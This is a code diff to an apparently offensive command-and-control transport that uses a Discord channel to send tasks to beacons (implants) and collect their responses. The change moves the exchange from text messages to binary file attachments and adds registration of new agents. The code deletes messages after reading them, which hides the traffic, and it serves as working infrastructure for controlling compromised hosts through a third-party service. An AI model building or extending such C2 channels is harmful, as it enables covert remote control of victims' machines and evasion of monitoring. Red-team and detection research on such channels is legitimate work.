@@ -13,6 +13,21 @@ TASK_PREFIX = 'TaskForYou'
 RESP_PREFIX = 'RespForYou'
 
 
+def writeToBinFile(data, fileName):
+    """
+    Writes binary data to a .bin file.
+    """
+    with open(fileName, "wb") as f:
+        f.write(data)
+
+def readFromBinFile(fileName):
+    """
+    Reads binary data from a .bin file.
+    """
+    with open(fileName, "rb") as f:
+        return f.read()
+
+
 def prepTransport():
     """
     Prepares the transport for communication. For Discord, no specific preparation is needed.
@@ -22,33 +37,52 @@ def prepTransport():
 
 async def sendData(data, beaconId):
     """
-    Sends data (task) to the beacon (agent) via a Discord message.
+    Sends data (task) to the beacon (agent) via a Discord message as a binary file.
     """
-    keyName = "{}:{}:{}".format(beaconId, TASK_PREFIX, str(uuid.uuid4()))
+    keyName = "{}:{}".format(beaconId, TASK_PREFIX)
+    fileName = f"{keyName}.bin"
+    
+    # Convert data to a .bin file
+    writeToBinFile(data, fileName)
+    
+    # Send the .bin file as an attachment
     channel = client.get_channel(COMMAND_CHANNEL_ID)
     if channel:
-        await channel.send(f"{keyName}:{data}")
+        file = discord.File(fileName, filename=fileName)
+        await channel.send(file=file)
+        os.remove(fileName)  # Clean up the file after sending
     else:
         print(f"Error: Could not find command channel {COMMAND_CHANNEL_ID}")
 
 
 async def retrieveData(beaconId):
     """
-    Retrieves data (response) from the beacon via Discord messages.
+    Retrieves data (response) from the beacon via Discord messages, expecting binary file attachments.
     """
     keyName = "{}:{}".format(beaconId, RESP_PREFIX)
     channel = client.get_channel(COMMAND_CHANNEL_ID)
+    taskResponses = []
+    
     if channel:
-        taskResponses = []
         async for message in channel.history(limit=100):  # Adjust the limit based on need
-            if message.content.startswith(f"{keyName}:"):
-                response = message.content.split(f"{keyName}:")[1]
-                taskResponses.append(response)
-                await message.delete()  # Delete the message after retrieving
+            if message.attachments:
+                for attachment in message.attachments:
+                    if attachment.filename.startswith(keyName):
+                        # Download the .bin file
+                        fileName = attachment.filename
+                        await attachment.save(fileName)
+                        
+                        # Read the binary data from the file
+                        data = readFromBinFile(fileName)
+                        taskResponses.append(data)
+                        
+                        os.remove(fileName)  # Clean up after reading
+                        await message.delete()  # Delete the message after retrieving the file
         return taskResponses
     else:
         print(f"Error: Could not find command channel {COMMAND_CHANNEL_ID}")
         return []
+
 
 
 async def fetchNewBeacons():
@@ -62,11 +96,12 @@ async def fetchNewBeacons():
     channel = client.get_channel(COMMAND_CHANNEL_ID)
     if channel:
         async for message in channel.history(limit=2):  # Adjust the limit based on need
-            if message.content.startswith("[+] Registering new agent AGENT:"):
-                beaconId = message.content.split("[+] Registering new agent AGENT:")[1]
-                print(f"[+] Discovered new Agent in channel: {beaconId}")
-                beacons.append(beaconId)
-                await message.delete()  # Delete the message after detecting the beacon
+            if message.content.startswith("AGENT:"):
+                beaconId = message.content.split("AGENT:")[1]
+                if beaconId not in beacons:
+                    print(f"[+] Discovered new Agent in channel: {beaconId}")
+                    beacons.append(beaconId)
+                    await message.delete()  # Delete the message after detecting the beacon
         if beacons:
             print(f"[+] Returning {len(beacons)} beacons for first-time setup.")
         return beacons
